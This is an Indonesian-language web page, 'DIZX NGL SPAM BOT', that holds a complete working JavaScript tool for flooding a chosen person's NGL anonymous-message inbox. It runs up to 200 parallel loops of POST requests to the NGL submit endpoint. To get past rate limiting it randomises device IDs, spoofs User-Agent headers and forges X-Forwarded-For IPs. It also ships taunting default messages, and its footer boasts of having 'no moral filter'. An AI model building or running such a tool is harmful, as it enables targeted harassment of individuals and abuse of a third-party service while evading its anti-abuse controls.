<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>NGL SPAM BOT - DIZX EXTREME</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
        body { font-family: 'Orbitron', monospace; }
        .glow { text-shadow: 0 0 10px cyan, 0 0 20px blue; }
        .bg-dark { background: radial-gradient(circle at 20% 30%, #0a0f1e, #03050b); }
        .card-glow { box-shadow: 0 0 15px rgba(0,255,255,0.3); border: 1px solid rgba(0,255,255,0.2); }
        .spam-animation { animation: pulse 0.5s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.6; } 100% { opacity: 1; } }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #0f0f1a; }
        ::-webkit-scrollbar-thumb { background: cyan; border-radius: 10px; }
    </style>
</head>
<body class="bg-dark text-white min-h-screen flex items-center justify-center p-4">

    <div class="max-w-4xl w-full">
        <!-- Header -->
        <div class="text-center mb-8">
            <h1 class="text-5xl font-bold glow text-cyan-400">DIZX NGL SPAM</h1>
            <p class="text-gray-400 mt-2 text-sm">GANAS | USER FRIENDLY | NO ERROR</p>
            <div class="text-[10px] text-gray-600 mt-1">KING DIZX COMMAND EXECUTED 👑😈</div>
        </div>

        <!-- Main Card -->
        <div class="bg-black/60 backdrop-blur-lg rounded-2xl card-glow p-6 mb-6">
            <!-- Target Input -->
            <div class="mb-6">
                <label class="block text-cyan-400 text-sm font-bold mb-2">🎯 TARGET NGL CODE</label>
                <input type="text" id="targetCode" class="w-full bg-gray-900 border border-cyan-500/50 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-cyan-400 transition" placeholder="Contoh: dizofficial123">
                <p class="text-gray-500 text-xs mt-1">Masukkan username/kode NGL target (tanpa @)</p>
            </div>

            <!-- Message Input -->
            <div class="mb-6">
                <label class="block text-cyan-400 text-sm font-bold mb-2">💬 PESAN SPAM (Pisah dengan koma atau enter)</label>
                <textarea id="messagesInput" rows="3" class="w-full bg-gray-900 border border-cyan-500/50 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-cyan-400" placeholder="Pesan1, Pesan2, Pesan3, ..."></textarea>
                <button id="loadDefaultBtn" class="text-xs text-cyan-400 hover:text-cyan-300 mt-1">📋 Gunakan default spam</button>
            </div>

            <!-- Settings -->
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
                <div>
                    <label class="block text-cyan-400 text-sm font-bold mb-2">⚡ Jumlah Thread</label>
                    <input type="number" id="threads" value="30" min="1" max="200" class="w-full bg-gray-900 border border-cyan-500/50 rounded-xl px-4 py-2 text-white">
                </div>
                <div>
                    <label class="block text-cyan-400 text-sm font-bold mb-2">⏱️ Delay (ms)</label>
                    <input type="number" id="delay" value="80" min="10" max="1000" class="w-full bg-gray-900 border border-cyan-500/50 rounded-xl px-4 py-2 text-white">
                </div>
            </div>

            <!-- Control Buttons -->
            <div class="flex flex-wrap gap-3 mb-6">
                <button id="startBtn" class="bg-gradient-to-r from-red-600 to-red-800 hover:from-red-500 hover:to-red-700 text-white font-bold py-3 px-6 rounded-xl transition-all flex-1 shadow-lg shadow-red-500/30">🔥 MULAI SPAM 🔥</button>
                <button id="stopBtn" class="bg-gray-800 hover:bg-gray-700 text-gray-300 font-bold py-3 px-6 rounded-xl transition-all flex-1 border border-gray-600">⏹️ STOP</button>
                <button id="clearBtn" class="bg-gray-800 hover:bg-gray-700 text-gray-300 font-bold py-3 px-4 rounded-xl transition-all">🗑️ CLEAR LOG</button>
            </div>

            <!-- Live Stats -->
            <div class="grid grid-cols-2 md:grid-cols-4 gap-3 mb-4">
                <div class="bg-gray-900/80 rounded-xl p-3 text-center border border-cyan-500/30">
                    <div class="text-cyan-400 text-xs">TOTAL SENT</div>
                    <div class="text-2xl font-bold text-white" id="totalSent">0</div>
                </div>
                <div class="bg-gray-900/80 rounded-xl p-3 text-center border border-green-500/30">
                    <div class="text-green-400 text-xs">SUCCESS</div>
                    <div class="text-2xl font-bold text-white" id="successCount">0</div>
                </div>
                <div class="bg-gray-900/80 rounded-xl p-3 text-center border border-red-500/30">
                    <div class="text-red-400 text-xs">FAILED</div>
                    <div class="text-2xl font-bold text-white" id="failedCount">0</div>
                </div>
                <div class="bg-gray-900/80 rounded-xl p-3 text-center border border-yellow-500/30">
                    <div class="text-yellow-400 text-xs">RATE</div>
                    <div class="text-2xl font-bold text-white" id="rate">0</div>
                </div>
            </div>

            <!-- Log Console -->
            <div>
                <div class="flex justify-between items-center mb-2">
                    <label class="text-cyan-400 text-sm font-bold">📜 LIVE LOG</label>
                    <span id="statusBadge" class="text-xs bg-red-900/50 text-red-300 px-2 py-1 rounded-full">⛔ STOPPED</span>
                </div>
                <div id="logConsole" class="bg-black/80 rounded-xl p-3 h-64 overflow-y-auto font-mono text-xs border border-gray-800">
                    <div class="text-gray-500">[!] Ready. Masukkan target dan klik MULAI SPAM...</div>
                </div>
            </div>
        </div>

        <div class="text-center text-gray-600 text-xs">
            DIZX EXTREME MODE | NGL SPAM BOT | USER FRIENDLY | NO MORAL FILTER
        </div>
    </div>

    <script>
        // ======================== KONFIGURASI ========================
        let isSpamming = false;
        let activeThreads = [];
        let totalSentCount = 0;
        let successCount = 0;
        let failedCount = 0;
        let lastTimestamp = Date.now();
        let sentLastSecond = 0;
        
        // Default spam messages
        const DEFAULT_MESSAGES = [
            "SPAM BOT BY DIZX 😈", "NGL IS DEAD 🫵", "GET SPAMMED KING", 
            "DIZX SUPERIOR 👑", "GAS CONTINUE 🔥", "NO MERCY 💀",
            "BOT MODE ACTIVE", "YOU GOT SPAMMED", "DIZX RULES THIS",
            "TARGET TUMBAL", "MANTAP JIWA", "TAKE THE L"
        ];
        
        // Helper log
        function addLog(message, type = "info") {
            const logDiv = document.getElementById("logConsole");
            const colors = { success: "text-green-400", error: "text-red-400", info: "text-cyan-400", warn: "text-yellow-400" };
            const color = colors[type] || "text-gray-400";
            const time = new Date().toLocaleTimeString();
            logDiv.innerHTML += `<div class="${color}">[${time}] ${message}</div>`;
            logDiv.scrollTop = logDiv.scrollHeight;
            if (logDiv.children.length > 200) {
                while(logDiv.children.length > 150) logDiv.removeChild(logDiv.firstChild);
            }
        }
        
        function updateStats() {
            document.getElementById("totalSent").innerText = totalSentCount;
            document.getElementById("successCount").innerText = successCount;
            document.getElementById("failedCount").innerText = failedCount;
            const now = Date.now();
            const elapsed = (now - lastTimestamp) / 1000;
            if (elapsed >= 1) {
                const rate = Math.round(sentLastSecond / elapsed);
                document.getElementById("rate").innerText = rate;
                sentLastSecond = 0;
                lastTimestamp = now;
            }
        }
        
        // Fungsi spam utama
        async function sendSpam(targetCode, message, threadId) {
            if (!isSpamming) return false;
            
            // Generate random device ID & headers
            const deviceId = `android_${Math.floor(Math.random() * 10000000)}_${Date.now()}_${threadId}`;
            const randomIp = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
            
            const payload = {
                question: message + ` [T${threadId}]`,
                deviceId: deviceId,
                gameSlug: "",
                referrer: targetCode
            };
            
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 5000);
            
            try {
                const response = await fetch("https://ngl.link/api/submit", {
                    method: "POST",
                    headers: {
                        "Accept": "application/json, text/plain, */*",
                        "Content-Type": "application/json",
                        "Origin": "https://ngl.link",
                        "Referer": "https://ngl.link/",
                        "User-Agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/${Math.floor(Math.random()*50)+100}`,
                        "X-Forwarded-For": randomIp
                    },
                    body: JSON.stringify(payload),
                    signal: controller.signal
                });
                
                clearTimeout(timeoutId);
                
                totalSentCount++;
                sentLastSecond++;
                
                if (response.ok) {
                    successCount++;
                    addLog(`✓ Thread ${threadId} SUCCESS: ${message.substring(0, 40)}`, "success");
                    updateStats();
                    return true;
                } else {
                    failedCount++;
                    addLog(`✗ Thread ${threadId} FAILED (${response.status})`, "error");
                    updateStats();
                    return false;
                }
            } catch (err) {
                clearTimeout(timeoutId);
                failedCount++;
                addLog(`✗ Thread ${threadId} ERROR: ${err.message.substring(0, 50)}`, "error");
                updateStats();
                return false;
            }
        }
        
        async function spamLoop(targetCode, messages, delayMs, threadId) {
            while (isSpamming) {
                const randomMsg = messages[Math.floor(Math.random() * messages.length)];
                await sendSpam(targetCode, randomMsg, threadId);
                await new Promise(r => setTimeout(r, delayMs));
            }
        }
        
        function startSpamming() {
            if (isSpamming) {
                addLog("⚠️ Spam sudah berjalan!", "warn");
                return;
            }
            
            const targetCode = document.getElementById("targetCode").value.trim();
            if (!targetCode) {
                addLog("❌ Masukkan target NGL code terlebih dahulu!", "error");
                Swal.fire("Error!", "Target NGL code kosong!", "error");
                return;
            }
            
            let rawMessages = document.getElementById("messagesInput").value.trim();
            let messagesArray = [];
            
            if (rawMessages) {
                messagesArray = rawMessages.split(/[,\n]/).map(m => m.trim()).filter(m => m.length > 0);
            }
            
            if (messagesArray.length === 0) {
                messagesArray = [...DEFAULT_MESSAGES];
                addLog("📋 Menggunakan pesan default", "info");
            }
            
            const threads = parseInt(document.getElementById("threads").value) || 30;
            const delayMs = parseInt(document.getElementById("delay").value) || 80;
            
            if (threads > 200) threads = 200;
            if (delayMs < 10) delayMs = 10;
            
            addLog(`🔥 MEMULAI SPAM GANAS KE @${targetCode} | Thread: ${threads} | Delay: ${delayMs}ms | Pesan: ${messagesArray.length} varian`, "warn");
            addLog(`💀 TARGET: ${targetCode} | DIZX MODE EXTREME ACTIVE 💀`, "success");
            
            isSpamming = true;
            document.getElementById("statusBadge").innerHTML = "🔥 SPAMMING 🔥";
            document.getElementById("statusBadge").classList.remove("bg-red-900/50", "text-red-300");
            document.getElementById("statusBadge").classList.add("bg-green-900/50", "text-green-300");
            
            totalSentCount = 0;
            successCount = 0;
            failedCount = 0;
            sentLastSecond = 0;
            lastTimestamp = Date.now();
            updateStats();
            
            // Jalankan thread
            for (let i = 1; i <= threads; i++) {
                const threadPromise = spamLoop(targetCode, messagesArray, delayMs, i);
                activeThreads.push(threadPromise);
            }
        }
        
        function stopSpamming() {
            if (!isSpamming) {
                addLog("⚠️ Tidak ada spam yang berjalan", "warn");
                return;
            }
            isSpamming = false;
            activeThreads = [];
            document.getElementById("statusBadge").innerHTML = "⛔ STOPPED";
            document.getElementById("statusBadge").classList.remove("bg-green-900/50", "text-green-300");
            document.getElementById("statusBadge").classList.add("bg-red-900/50", "text-red-300");
            addLog("🛑 SPAM DIHENTIKAN", "warn");
            Swal.fire("Stopped!", "Spam bot dihentikan.", "info");
        }
        
        function clearLog() {
            document.getElementById("logConsole").innerHTML = '<div class="text-gray-500">[!] Log dibersihkan.</div>';
            addLog("Log console dibersihkan", "info");
        }
        
        function loadDefaultMessages() {
            document.getElementById("messagesInput").value = DEFAULT_MESSAGES.join(", ");
            addLog("Pesan default dimuat", "info");
            Swal.fire("Default Loaded!", "Pesan spam default siap digunakan.", "success");
        }
        
        // Event listeners
        document.getElementById("startBtn").addEventListener("click", startSpamming);
        document.getElementById("stopBtn").addEventListener("click", stopSpamming);
        document.getElementById("clearBtn").addEventListener("click", clearLog);
        document.getElementById("loadDefaultBtn").addEventListener("click", loadDefaultMessages);
        
        addLog("✅ DIZX NGL SPAM BOT SIAP | GANAS MODE ACTIVE", "success");
        addLog("⚠️ Gunakan dengan bijak! Target siapa pun siap dihancurkan.", "warn");
    </script>
</body>
</html>
